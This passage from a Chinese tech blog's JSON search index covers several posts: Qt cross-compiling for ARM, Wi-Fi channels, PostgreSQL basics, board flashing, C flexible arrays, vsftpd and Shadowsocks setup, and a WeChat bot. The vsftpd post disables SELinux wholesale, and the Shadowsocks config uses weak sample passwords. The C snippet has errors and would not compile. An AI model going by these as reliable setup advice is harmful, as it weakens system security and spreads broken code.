include(../common/g++-unix.conf) # modifications to g++.conf QMAKE_CC = arm-none-linux-gnueabi-gcc QMAKE_CXX = arm-none-linux-gnueabi-g++ QMAKE_LINK = arm-none-linux-gnueabi-g++ QMAKE_LINK_SHLIB = arm-none-linux-gnueabi-g++ # modifications to linux.conf QMAKE_AR = arm-none-linux-gnueabi-ar cqs QMAKE_OBJCOPY = arm-none-linux-gnueabi-objcopy QMAKE_NM = arm-none-linux-gnueabi-nm -P QMAKE_STRIP = arm-none-linux-gnueabi-strip load(qt_config) 2. vi qt-everywhere-opensource-src-5.7.0/autoConfigure.sh #!/bin/sh ./configure \\ -v \\ -prefix /opt/qt-5.7.0 \\ -release \\ -opensource \\ -no-accessibility -make libs \\ -xplatform linux-arm-gnueabi-g++ \\ -optimized-qmake \\ -pch \\ -qt-sql-sqlite \\ -qt-zlib \\ -tslib \\ -no-opengl \\ -no-sse2 \\ -no-openssl \\ -no-nis \\ -no-cups \\ -no-glib \\ -no-pkg-config \\ -no-separate-debug-info \\ -I/opt/tslib1.4/include -L/opt/tslib1.4/lib 3. make &amp;&amp; make install 将/opt/qt-5.7.0和/opt/tslib1.4 拷贝到开发板的文件系统中对应的目录中。 /放置到开发板opt/ 目录下即可; 设置环境变量，并source生效; tslib qt5.7移植参考 tslib 编译常见问题 以及解决办法","categories":[{"name":"Arm","slug":"Arm","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Arm/"}],"tags":[{"name":"Arm","slug":"Arm","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Arm/"}]},{"title":"Tp-link 信道","slug":"kali/tp-link-信道","date":"2017-08-08T03:17:31.000Z","updated":"2018-11-19T16:06:18.757Z","comments":true,"path":"2017/08/08/kali/tp-link-信道/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/08/08/kali/tp-link-信道/","excerpt":"一、 什么是信道: 信道， 也称作通道或者频段， 是以无线信号作为传输载体的数据信号传送通道。 2.4G频段的工作频率为2.4-2.4835Ghz， 这个83.5MHz 频带划分为13个信道。 各信道中心频率相差5Mhz，向上向下分别扩展11Mhz， 信道宽带22Mhz 中国采用欧洲/ETSI标准，使用1-13信道。","text":"一、 什么是信道: 信道， 也称作通道或者频段， 是以无线信号作为传输载体的数据信号传送通道。 2.4G频段的工作频率为2.4-2.4835Ghz， 这个83.5MHz 频带划分为13个信道。 各信道中心频率相差5Mhz，向上向下分别扩展11Mhz， 信道宽带22Mhz 中国采用欧洲/ETSI标准，使用1-13信道。 相近无线路由器采用相同或者重叠信道会形成信道竞争关系， 相互影响无线链路质量，为了有效避免信道重叠造成的相互干扰，相近无线路由器应选择互不重叠的信道工作，如(1/、6、11) 或者 (1、7、13) 等; 二、 信道推荐自动选择 早期无线路器出厂时预设相同的信道(大多为6)，因用户很少会修改信道，从未导致相互影响的情况.随着无线应用的迅速普及，无线路由器增加了信道自动选择功能，在设备启动时，检测周围无线信道分布情况，选择最佳信道工作。 无线信道自动选择的作用是: 信道重叠会导致无线路由器相互干扰， 进而影响无线传输质量，信道自动选择功能使路由器根据周围无线环境自动设置最佳工作信道， 有效避免同频干扰/竞争. 三、 什么情况需要手动选择信道在以下应用中，我们建议手动选择路由器的信道： 1、传统界面路由器在设置WDS无线桥接或多个无线路由器通过LAN-LAN级联设置漫游网络时时，建议设置固定的信道； 2、部分无线终端可能无法识别12或13信道，当路由器自动选择这两个信道时，无线终端无法搜索到信号，此时需要将路由器的信道固定为1-11之间。 3、无线干扰严重。无线信道自动选择功能在路由器启动后会根据当前的环境自动设置到最佳工作信道，直到路由器重启前，该信道都不会改变，但实际环境中，可能路由器工作过程中周围无线环境发生了变化，引起较强的无线干扰，此时需要考虑手动设置信道。 四、 手机软件扫描软件 Next 注意：信号强度以负数表示，其绝对值越小，表示信号越强。例如扫描的A信号强度为-45，B信号为-70，则A信号强于B信号。 根据周围环境中其他信号使用的信道和强度，在自己无线路由器中选择一个没有使用的信道或者周围弱信号使用的信道。 参考Tp_link 服务支持","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/渗透/"},{"name":"Kali","slug":"Kali","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Kali/"}]},{"title":"Postgresql 入门学习","slug":"database/Postgresql-入门学习","date":"2017-07-15T10:23:52.000Z","updated":"2019-09-18T12:19:10.229Z","comments":true,"path":"2017/07/15/database/Postgresql-入门学习/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/07/15/database/Postgresql-入门学习/","excerpt":"自从mysql被Oracle收购之后， Postgresql逐渐成为开源关系型数据库的首选.关系型数据库: 采用标准sql语句， 进行数据的检索 和 操作; 主要从Ubutnu/Debain apt-get 系列讲解安装Postgresql","text":"自从mysql被Oracle收购之后， Postgresql逐渐成为开源关系型数据库的首选.关系型数据库: 采用标准sql语句， 进行数据的检索 和 操作; 主要从Ubutnu/Debain apt-get 系列讲解安装Postgresql 1. Install PostGresql安装PostgreSql客户端 sudo apt-get install postgresql-client 安装PostgreSql服务端 sudo apt-get install postgresql 基本配置信息在上图均有体现:. config 配置目录 . data 数据. locale 本地编码 . port 端口信息 2. 添加新用户 和 新数据库安装之后，默认生成一个名为postgres的数据库 和 一个 名为 postgres 的数据库用户， 同时还生成了一个postgres的Linux系统用户 sudo su - postgres // 登陆到postgres用户 psql // 链接进postgresql数据管理软件 -- 相当使用 postgres 数据库用户 \\password postgres // 为postgres 数据库用户创建密码 创建数据库用户: create user dbuser with password &apos;dbuser&apos;; 创建用户数据库: create database dbuserdb owner dbuser; 权限分配 grant all privileges on database dbuserdb to dbuser; 3. 登陆数据库sql -U 用户名 -d 数据库名称 -h ip地址 -p 端口 当使用当前用户登陆时， 可以省略 -U 标签; 4. 控制台命令: \\h 查看SQL语句的解释 \\h select \\? 查看psql命令列表 \\l 列出所有数据库 \\c [database_name] 链接其他数据库 \\d 列出当前数据库的所有表格 \\d [table_name] \\du 列出所有用户 \\e 打开文本编辑器 \\conninfo 列出当前数据库和链接的信息 \\password 修改用户密码 5. 基本数据库操作:基本关系型数据库基本通用sql&gt; create select insert update alter drop delete 等常用命令 1. #查看表结构 dbuserdb=&gt; \\d sysuser Table &quot;public.sysuser&quot; Column | Type | Modifiers ----------+-----------------------+----------- id | integer | username | character varying(30) | sigdate | date | 2. #创建表 create table sysuser(id int, username varchar(30), sigdate date); 3. #插入数据 insert into sysuser (id, username , sigdate) values(1, &apos;Postgres&apos;, now()); 4. #查询特定条件 dbuserdb=&gt; select * from sysuser where id=1; id | username | sigdate ----+----------+------------ 1 | Postgres | 2017-07-12 (1 row) 5. #删除记录 dbuserdb=&gt; delete from sysuser where id=1; DELETE 1 6. #添加特殊条件 dbuserdb=&gt; alter table sysuser alter column id set not null; ALTER TABLE dbuserdb=&gt; dbuserdb=&gt; \\d sysuser; Table &quot;public.sysuser&quot; Column | Type | Modifiers ----------+-----------------------+----------- id | integer | not null username | character varying(30) | sigdate | date | eamil | character varying(20) | 7. #修改表名 dbuserdb=&gt; alter table sysuser rename to systemuser; ALTER TABLE dbuserdb=&gt; \\d List of relations Schema | Name | Type | Owner --------+------------+-------+-------- public | systemuser | table | dbuser (1 row) 8. #修改列名 dbuserdb=&gt; alter table systemuser rename COLUMN sigdate to sig_date dbuserdb-&gt; ; ALTER TABLE dbuserdb=&gt; dbuserdb=&gt; \\d systemuser; Table &quot;public.systemuser&quot; Column | Type | Modifiers ----------+-----------------------+----------- id | integer | not null username | character varying(30) | sig_date | date | eamil | character varying(20) | 9. #删除字段: dbuserdb=&gt; alter table systemuser drop column eamil ; ALTER TABLE dbuserdb=&gt; dbuserdb=&gt; \\d systemuser Table &quot;public.systemuser&quot; Column | Type | Modifiers ----------+-----------------------+----------- id | integer | not null username | character varying(30) | sig_date | date | 10. #更新字段: dbuserdb=&gt; \\d List of relations Schema | Name | Type | Owner --------+------------+-------+-------- public | systemuser | table | dbuser (1 row) dbuserdb=&gt; \\d systemuser Table &quot;public.systemuser&quot; Column | Type | Modifiers ----------+-----------------------+----------- id | integer | not null username | character varying(30) | sig_date | date | dbuserdb=&gt; dbuserdb=&gt; select * from systemuser ; id | username | sig_date ----+----------+---------- (0 rows) ^ dbuserdb=&gt; insert into systemuser (id, username , sig_date) values(1, &apos;Postgres&apos;, now()); INSERT 0 1 dbuserdb=&gt; dbuserdb=&gt; dbuserdb=&gt; select * from systemuser ; id | username | sig_date ----+----------+------------ 1 | Postgres | 2017-07-12 (1 row) dbuserdb=&gt; update systemuser set username = &apos;wang&apos; where id = 1; UPDATE 1 dbuserdb=&gt; select * from systemuser ; id | username | sig_date ----+----------+------------ 1 | wang | 2017-07-12 (1 row) 11. #删除表 dbuserdb=&gt; drop table systemuser ; DROP TABLE dbuserdb=&gt; dbuserdb=&gt; \\d No relations found. dbuserdb=&gt;","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Database/"},{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"讯为 4412 arm 开发板烧写系统","slug":"arm-4412/讯为-4412-开发板烧纸系统","date":"2017-07-15T10:14:32.000Z","updated":"2018-12-05T10:58:30.561Z","comments":true,"path":"2017/07/15/arm-4412/讯为-4412-开发板烧纸系统/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/07/15/arm-4412/讯为-4412-开发板烧纸系统/","excerpt":"工具软件usb 转 串口: iTOP-4412开发板所需PC软件（工具）\\01-USB转串口（PL2302驱动）\\win8.1串口驱\\迅为_PL2303_win8.1.exe 烧制软件： iTOP-4412开发板所需PC软件（工具）\\05-fastboot烧写工具\\platform-tools","text":"工具软件usb 转 串口: iTOP-4412开发板所需PC软件（工具）\\01-USB转串口（PL2302驱动）\\win8.1串口驱\\迅为_PL2303_win8.1.exe 烧制软件： iTOP-4412开发板所需PC软件（工具）\\05-fastboot烧写工具\\platform-tools 镜像 与 ADB将 ubuntu 源码 镜像: system uboot zImage zImage_sd 放置在烧制软件的根目录下。 并建立Ubutnu目录，存放; 确认是否终端 &amp; 串口保持链接: 首先打开超级终端选用com3 连接到arm开发板; 先检查adb 是否链接成功; 在使用cmd进行烧制 发现adb驱动未安装; android_usb_40_1_2_3_64.exe // 安装驱动； 发现安装成功， 并显示android Phone . 即安装成功; ​ Arm 板分区格式化 给eMMC创建分区并格式化: 1$fdisk -c 0 按照默认方式给eMMC分区，可以分为四个区：用户应用区、系统区、用户资料去、缓存区。 fdisk的Usage:​ fdisk &lt;-p&gt; &lt;device_num&gt;​ fdisk &lt;-c&gt; &lt;device_num&gt; [&lt;sys. part size(MB)&gt; &lt;user part size&gt; &lt;cache part size&gt;]-p代表查看操作，-c代表分区操作device_num=0 代表eMMC;device_num=1 代表TF/SD卡不加参数时按照默认方式进行分区;加参数时按照参数大小对存储器后三个区进行分区，例如： 1$fdisk -c 0 300 300 300 ​ Arm-4412 Ubuntu烧写烧制Ubuntu过程: 必须使用tf卡; 打开fastboot烧制软件 cmd 命令窗口; 将tf卡直接插入arm开发板中; 进行tf卡对应分区 fdisk -c 1 2700 50 50 fatformat mmc 1:1 ext3format mmc 1:2 ext3format mmc 1:3 ext3format mmc 1:4 拔下电源， 使用读卡器 读取 tf卡， 在ubuntu里查看其分区 fdisk -l 发现第一个 1:1 为ext3 即linux分区。 我们将system中的系统文件，解压到此分区下。 中间可以使用 mount 文件挂载， 然后拷贝其中，并解压 将tf卡链接到window下，建立sdupdate目录，将系统文件， zImage zImage_sd 拷贝到此目录下 为arm板 插入tf卡，重新启动， 进入超级终端: 为板子进行烧制分区 以及 烧制镜像; fdisk -c 0 2700 300 300 fatformat mmc 0:1 ext3format mmc 0:2 ext3format mmc 0:3 ext3format mmc 0:4 分区后，为板子加载引导: 继续在超级终端中: sdfuse flash bootloader u-boot-iTOP-4412.bin 烧制sd卡的引导驱动: sdfuse flash kernel zImage_sd reset 重启; 此时我们将板子的分区以及引导做好了，但是我们的文件系统都是加载的tf卡的， 故我们还需要继续烧制文件系统到板子上 进入ubutnu界面: fdisk -l 我们会发现存在两个硬盘， 0 代表板子硬盘， 第二块则是我们的tf卡硬盘; 在主用户根目录下，建立mm, tf 目录， 将我们板子硬盘的第一个linux分区(ext3)挂载到mm下， tf卡的第一个分区(window fat)挂在到tf目录上， 我们会发现tf目录中存在ubuntu的文件镜像压缩包，将其拷贝到mm文件夹下； 并解压缩 最后我们烧制本身板子的文件系统， 即重启， 进入超级终端中: sdfuse flash kernel zImage 关机，拔下tf卡，即可加载板子上的文件系统镜像 Arm-4412 烧写安卓、Qt烧制 安卓 qtE过程: [以前少写可忽略] 进入超级终端: 为板子进行烧制分区 以及 烧制镜像; 1. fdisk -c 0 2700 300 300 2. fatformat mmc 0:1 3. ext3format mmc 0:2 4. ext3format mmc 0:3 5. ext3format mmc 0:4 打开fastboot烧制软件 cmd 命令窗口; 烧制uboot: fastboot.exe flash bootloader u-boot-iTop-4412.bin – bootloader 引导驱动， 重新分区 / 写入之前在超级终端输入 fastboot; 并查看设备管理器是否扫描出arm板; 否则fastboot cmd的程序会一直等待 驱动; 烧制zImage: fastboot.exe flash kernel zImage 烧制ramdisk: fastboot.exe flash ramdisk ramdisk-uboot.img 烧制system文件系统: fastboot.exe flash system system.img 擦除： fastboot -w fastboot reboot 虚拟机编译镜像搭建ubuntu 14.04 编译环境 并 编译zImage 与 u-boot.bin: 因此重新搭建ubuntu 编译环境 将 arm交叉编译器移植过来 发现一直到 /usr/local/arm/ 下并放置生成 PATH 环境变量发现并不能成功; 编译 Uboot 引导文件; 解决: sudo apt-get install lib32z1 # 安装插件库; 编译成功: cp config_for_linux_pop_supper .config make zImage","categories":[{"name":"Arm","slug":"Arm","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Arm/"}],"tags":[{"name":"Arm","slug":"Arm","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Arm/"}]},{"title":"fixablearray-柔性数组","slug":"cpluscplus/fixablearray-柔性数组","date":"2017-07-12T11:25:10.000Z","updated":"2018-11-19T16:04:57.141Z","comments":true,"path":"2017/07/12/cpluscplus/fixablearray-柔性数组/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/07/12/cpluscplus/fixablearray-柔性数组/","excerpt":"C99规定: 不完整类型是这样一种类型， 它缺乏足够的信息 例如长度去描述一个完整的对象; 它的出现反映出C程序员对精炼代码的极致追求。产生了对动态结构的需求; C99 使用不完整类型实现柔性数组成员. C99中 结构中的最后一个元素允许是未知大小的数组. 这就是 柔性数组 也叫做 伸缩性数组成员; 但是结构体中的柔性成员前边 必须至少有一个其他成员. 柔性数组成员 只作为一个符号地址存在 ， 而且必须是结构体的最后一个成员. sizeof 返回这种结构体的大小不包括柔性数组的内存；","text":"C99规定: 不完整类型是这样一种类型， 它缺乏足够的信息 例如长度去描述一个完整的对象; 它的出现反映出C程序员对精炼代码的极致追求。产生了对动态结构的需求; C99 使用不完整类型实现柔性数组成员. C99中 结构中的最后一个元素允许是未知大小的数组. 这就是 柔性数组 也叫做 伸缩性数组成员; 但是结构体中的柔性成员前边 必须至少有一个其他成员. 柔性数组成员 只作为一个符号地址存在 ， 而且必须是结构体的最后一个成员. sizeof 返回这种结构体的大小不包括柔性数组的内存； 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct fixarray&#123; int size; int value[]; // 柔性数组; &#125;fixarray;// 创建时 最好用malloc 预留足够的大小; 放置内存溢出fixarray *stpTest = (test *)malloc(sizeof(fixarray)+100*sizeof(int)); int main(void)&#123; printf(&quot;sizeof(int) = %d\\n&quot;, sizeof(int)); // 大小为4 printf(&quot;sizeof(fixarray) = %d\\n&quot;, sizeof(fixarray));// 大小为4 return 0;&#125;","categories":[],"tags":[{"name":"C/C++","slug":"C-C","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/C-C/"}]},{"title":"Centos 7 搭建Vsftpd","slug":"yunwei/Centos-7-搭建vsftpd","date":"2017-07-12T07:19:46.000Z","updated":"2018-01-12T11:42:47.851Z","comments":true,"path":"2017/07/12/yunwei/Centos-7-搭建vsftpd/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/07/12/yunwei/Centos-7-搭建vsftpd/","excerpt":"vsftpd 是“very secure FTP daemon”的缩写，安全性是它的一个最大的特点。vsftpd 是一个 UNIX 类操作系统上运行的服务器的名字，它可以运行在诸如 Linux、BSD、Solaris、 HP-UNIX等系统上面，是一个完全免费的、开发源代码的ftp服务器软件，支持很多其他的 FTP 服务器所不支持的特征。比如：非常高的安全性需求、带宽限制、良好的可伸缩性、可创建虚拟用户、支持IPv6、速率高等。","text":"vsftpd 是“very secure FTP daemon”的缩写，安全性是它的一个最大的特点。vsftpd 是一个 UNIX 类操作系统上运行的服务器的名字，它可以运行在诸如 Linux、BSD、Solaris、 HP-UNIX等系统上面，是一个完全免费的、开发源代码的ftp服务器软件，支持很多其他的 FTP 服务器所不支持的特征。比如：非常高的安全性需求、带宽限制、良好的可伸缩性、可创建虚拟用户、支持IPv6、速率高等。 一. 通过yum安装vsftpyum install -y vsftpd 二. 修改vsftpd的配置文件vi /etc/vsftpd/vsftpd.conf 修改配置文件 1. 不允许匿名访问 anonymous_enable=NO ## 允许匿名登陆是 默认账户为 ftp@ip:21 2. 允许使用本地账户进行ftp登陆验证: local_enable=YES 3. 使用户不能离开主目录 chroot_local_user=YES chroot_list_enable=YES chroot_list_file=/etc/vsftpd/chroot_list 配置文件最后添加 allow_writeable_chroot=YES 如果/etc/vsftpd/chroot_list不存在，则需要创建该文件 touch /etc/vsftpd/chroot_list 重启vsftpd服务: systemctl restart vsftpd.service 新建ftp用户 useradd -d /var/ftp/public_root -g ftp -s /sbin/nologin ftpuser 密码: passwd ftpuser 关闭防火墙 和 SELinux:setenforce 0 # 设置SELinux 成为permissive模式 （关闭SELinux） setenforce 1 # 设置SELinux 成为enforcing模式 （开启SELinux） # 或者修改配置 vi /etc/selinux/config # SELINUX=enforcing # 注释掉 # SELINUXTYPE=targeted # 注释掉 SELINUX=disabled # 增加 :wq! #保存退出 setenforce 0 防火墙添加Ftp服务: firewall-cmd --permanent --zone=public --add-service=ftp firewall-cmd --reload","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"}]},{"title":"CentOS 7 搭建Shadowsock","slug":"yunwei/CentOS-7-搭建Shadowsock","date":"2017-07-11T02:56:01.000Z","updated":"2018-01-12T11:43:09.299Z","comments":true,"path":"2017/07/11/yunwei/CentOS-7-搭建Shadowsock/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/07/11/yunwei/CentOS-7-搭建Shadowsock/","excerpt":"Shadowsocks是什么？ Shadowsocks是一个安全的Socks代理，用于保护网络流量不被干扰，也是开源的项目；主要特性包括： a、快速（异步I/O和事件驱动程序）。 b、安全（所有的流量都经过加密算法加密，支持自定义算法）。 c、支持移动客户端（专为移动设备和无线网络优化）。 d、跨平台（可运行于包括PC，Mac，手机（Android和iOS）和路由器（OpenWrt）在内的多种平台上）。 e、使用Socks5协议和可自定义密码的工业级算法加密，流量在网络传输过程中不易被他人读取。 f、开源。 g、易于维护。","text":"Shadowsocks是什么？ Shadowsocks是一个安全的Socks代理，用于保护网络流量不被干扰，也是开源的项目；主要特性包括： a、快速（异步I/O和事件驱动程序）。 b、安全（所有的流量都经过加密算法加密，支持自定义算法）。 c、支持移动客户端（专为移动设备和无线网络优化）。 d、跨平台（可运行于包括PC，Mac，手机（Android和iOS）和路由器（OpenWrt）在内的多种平台上）。 e、使用Socks5协议和可自定义密码的工业级算法加密，流量在网络传输过程中不易被他人读取。 f、开源。 g、易于维护。 1.安装python-pip: yum install python-setuptools &amp;&amp; easy_install pip 2.安装 shadowsock: pip install --upgrade pip pip install shadowsocks 2.1 配置 shadowsocks /etc/shadowsocks.json 内容如下: { &quot;server&quot;: &quot;0.0.0.0&quot;, &quot;server_port&quot;: 8388, &quot;password&quot;: &quot;a123456&quot;, &quot;method&quot;: &quot;aes-256-cfb&quot; } 配置多个port端口: { &quot;server&quot;: &quot;0.0.0.0&quot;, &quot;port_password&quot;: { &quot;8388&quot;:&quot;a123456&quot;, &quot;8387&quot;:&quot;b123456&quot;, &quot;8386&quot;:&quot;c123456&quot; }, &quot;method&quot;: &quot;aes-256-cfb&quot; } method:为加密方法，可选aes-128-cfb, aes-192-cfb, aes-256-cfb, bf-cfb, cast5-cfb, des-cfb, rc4-md5, chacha20, salsa20, rc4, table 2.2 配置自启脚本: vi /etc/systemd/system/shadowsocks.service 内容如下: [Unit] Description=Shadowsocks [Service] TimeoutStartSec=0 ExecStart=/usr/bin/ssserver -c /etc/shadowsocks.json [Install] WantedBy=multi-user.target 2.3 启动shadowsock服务: systemctl enable shadowsocks #加入开机启动 systemctl start shadowsocks #启动 systemctl restart shadowsocks #重新启动服务 3.防火墙配置 若是不是存在别的服务程序不为默认端口请修改: 例如: ssh 使用 28392 firewall-cmd --zone=public --add-port=28392/tcp --permanent firewall-cmd --reload ​ shadowsock 需要修改端口: firewall-cmd --zone=public --add-port=8388/tcp --permanent systemctl restart firewalld.service # 启动防火墙 firewall-cmd --list-cmd # 查看防火墙规则 客户端使用sslocal 进行科学上网: 1sslocal -c shadowsock.json -d start // 并后台启动 cat shadowsock.json 12345678&#123;&quot;server&quot;: &quot;your-ip&quot;,&quot;server_port&quot;: your-port,&quot;local_port&quot;: 1080,&quot;password&quot;: &quot;your-passwd&quot;,&quot;timeout&quot;: 60,&quot;method&quot;: &quot;aes-256-cfb&quot;&#125; 报错: AttributeError: /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanup pip install -U git+https://github.com/shadowsocks/shadowsocks.git@master","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Shadowsock","slug":"Shadowsock","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Shadowsock/"}]},{"title":"Python + Tornado 搭建自动回复微信公众号","slug":"gram/python_tornado_微信公众号","date":"2017-07-10T01:54:41.000Z","updated":"2018-11-19T16:13:21.742Z","comments":true,"path":"2017/07/10/gram/python_tornado_微信公众号/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/07/10/gram/python_tornado_微信公众号/","excerpt":"用于个人微信订阅号，实现消息自动回复与自动聊天 微信公众号 图灵API接口","text":"用于个人微信订阅号，实现消息自动回复与自动聊天 微信公众号 图灵API接口 1 通过 pip 安装 wechat-python-sdk ， Requests 以及 Tornado 123pip install tornadopip install wechat-sdkpip install requests 2 订阅号申请要搭建订阅号，首先需要在微信公众平台官网进行注册，注册网址: 微信公众平台。目前个人用户可以免费申请微信订阅号，虽然很多权限申请不到，但是基本的消息回复是没有问题的。 服务器接入 具体的接入步骤可以参考官网上的接入指南。 本订阅号的配置为： 进行修改配置，提交时，需要验证服务器地址的有效性 wechat.py 1234567891011121314151617181920212223242526import tornado.escapeimport tornado.webfrom wechat_sdk import WechatConfconf = WechatConf( token=&apos;your_token&apos;, # 你的公众号Token appid=&apos;your_appid&apos;, # 你的公众号的AppID appsecret=&apos;your_appsecret&apos;, # 你的公众号的AppSecret encrypt_mode=&apos;safe&apos;, # 可选项：normal/compatible/safe，分别对应于 明文/兼容/安全 模式 encoding_aes_key=&apos;your_encoding_aes_key&apos; # 如果传入此值则必须保证同时传入 token, appid)from wechat_sdk import WechatBasicwechat = WechatBasic(conf=conf)class WX(tornado.web.RequestHandler): def get(self): signature = self.get_argument(&apos;signature&apos;, &apos;default&apos;) timestamp = self.get_argument(&apos;timestamp&apos;, &apos;default&apos;) nonce = self.get_argument(&apos;nonce&apos;, &apos;default&apos;) echostr = self.get_argument(&apos;echostr&apos;, &apos;default&apos;) if signature != &apos;default&apos; and timestamp != &apos;default&apos; and nonce != &apos;default&apos; and echostr != &apos;default&apos; \\ and wechat.check_signature(signature, timestamp, nonce): self.write(echostr) else: self.write(&apos;Not Open&apos;) wechat_main.py 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python#coding:utf-8import tornado.webimport tornado.httpserverfrom tornado.options import define, optionsimport osimport wechatsettings = &#123; &apos;static_path&apos;: os.path.join(os.path.dirname(__file__), &apos;static&apos;), &apos;template_path&apos;: os.path.join(os.path.dirname(__file__), &apos;view&apos;), &apos;cookie_secret&apos;: &apos;xxxxxxxxxxx&apos;, &apos;login_url&apos;: &apos;/&apos;, &apos;session_secret&apos;: &quot;xxxxxxxxxxxxxxxxxxxxxxx&quot;, &apos;session_timeout&apos;: 3600, &apos;port&apos;: 8888, &apos;wx_token&apos;: &apos;your_token&apos;, &#125;web_handlers = [ (r&apos;/wechat&apos;, wechat.WX), ]#define(&quot;port&quot;, default=settings[&apos;port&apos;], help=&quot;run on the given port&quot;, type=int)from tornado.options import define, optionsdefine (&quot;port&quot;, default=8888, help=&quot;run on the given port&quot;, type=int)if __name__ == &apos;__main__&apos;: app = tornado.web.Application(web_handlers, **settings) tornado.options.parse_command_line() http_server = tornado.httpserver.HTTPServer(app) http_server.listen(options.port) tornado.ioloop.IOLoop.instance().start() cookie_secret session_secret 可以随便填写;配置好程序源代码后运行，确认运行无误后再在公众号设置页面点击 提交 ，如果程序运行没问题，会显示接入成功。 3 接入图灵机器人要接入图灵机器人，首先需要在官网申请API Key。 1234567891011121314151617181920212223class TulingAutoReply: def __init__(self, tuling_key, tuling_url): self.key = tuling_key self.url = tuling_url def reply(self, unicode_str): body = &#123;&apos;key&apos;: self.key, &apos;info&apos;: unicode_str.encode(&apos;utf-8&apos;)&#125; r = requests.post(self.url, data=body) r.encoding = &apos;utf-8&apos; resp = r.text if resp is None or len(resp) == 0: return None try: js = json.loads(resp) if js[&apos;code&apos;] == 100000: return js[&apos;text&apos;].replace(&apos;&lt;br&gt;&apos;, &apos;\\n&apos;) elif js[&apos;code&apos;] == 200000: return js[&apos;url&apos;] else: return None except Exception: traceback.print_exc() return None 4 编写公众号自动回复代码 12345678910111213141516171819202122232425262728293031auto_reply = TulingAutoReply(key, url) # key和url填入自己申请到的图灵key以及图灵请求urlclass WX(tornado.web.RequestHandler): def wx_proc_msg(self, body): try: wechat.parse_data(body) except ParseError: print(&apos;Invalid Body Text&apos;) return if isinstance(wechat.message, TextMessage): # 消息为文本消息 content = wechat.message.content reply = auto_reply.reply(content) if reply is not None: return wechat.response_text(content=reply) else: return wechat.response_text(content=u&quot;不知道你说的什么&quot;) return wechat.response_text(content=u&apos;知道了&apos;) def post(self): signature = self.get_argument(&apos;signature&apos;, &apos;default&apos;) timestamp = self.get_argument(&apos;timestamp&apos;, &apos;default&apos;) nonce = self.get_argument(&apos;nonce&apos;, &apos;default&apos;) if signature != &apos;default&apos; and timestamp != &apos;default&apos; and nonce != &apos;default&apos; \\ and wechat.check_signature(signature, timestamp, nonce): body = self.request.body.decode(&apos;utf-8&apos;) try: result = self.wx_proc_msg(body) if result is not None: self.write(result) except IOError as e: return 最终 wechat.py 代码如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import tornado.escapeimport tornado.web#from goose import Goose, ParseErrorimport jsonimport requestsimport tracebackfrom wechat_sdk import WechatConfconf = WechatConf( token=&apos;your_token&apos;, # 你的公众号Token appid=&apos;your_appid&apos;, # 你的公众号的AppID appsecret=&apos;your_appsecret&apos;, # 你的公众号的AppSecret encrypt_mode=&apos;safe&apos;, # 可选项：normal/compatible/safe，分别对应于 明文/兼容/安全 模式 encoding_aes_key=&apos;your_encoding_aes_key&apos; # 如果传入此值则必须保证同时传入 token, appid)from wechat_sdk import WechatBasicwechat = WechatBasic(conf=conf)class TulingAutoReply: def __init__(self, tuling_key, tuling_url): self.key = tuling_key self.url = tuling_url def reply(self, unicode_str): body = &#123;&apos;key&apos;: self.key, &apos;info&apos;: unicode_str.encode(&apos;utf-8&apos;)&#125; r = requests.post(self.url, data=body) r.encoding = &apos;utf-8&apos; resp = r.text if resp is None or len(resp) == 0: return None try: js = json.loads(resp) if js[&apos;code&apos;] == 100000: return js[&apos;text&apos;].replace(&apos;&lt;br&gt;&apos;, &apos;\\n&apos;) elif js[&apos;code&apos;] == 200000: return js[&apos;url&apos;] else: return None except Exception: traceback.print_exc() return Noneauto_reply = TulingAutoReply(key, url) # key和url填入自己申请到的图灵key以及图灵请求urlclass WX(tornado.web.RequestHandler): def wx_proc_msg(self, body): try: wechat.parse_data(body) except ParseError: print(&apos;Invalid Body Text&apos;) return if isinstance(wechat.message, TextMessage): # 消息为文本消息 content = wechat.message.content reply = auto_reply.reply(content) if reply is not None: return wechat.response_text(content=reply) else: return wechat.response_text(content=u&quot;不知道你说的什么&quot;) return wechat.response_text(content=u&apos;知道了&apos;) def post(self): signature = self.get_argument(&apos;signature&apos;, &apos;default&apos;) timestamp = self.get_argument(&apos;timestamp&apos;, &apos;default&apos;) nonce = self.get_argument(&apos;nonce&apos;, &apos;default&apos;) if signature != &apos;default&apos; and timestamp != &apos;default&apos; and nonce != &apos;default&apos; \\ and wechat.check_signature(signature, timestamp, nonce): body = self.request.body.decode(&apos;utf-8&apos;) try: result = self.wx_proc_msg(body) if result is not None: self.write(result) except IOError as e: 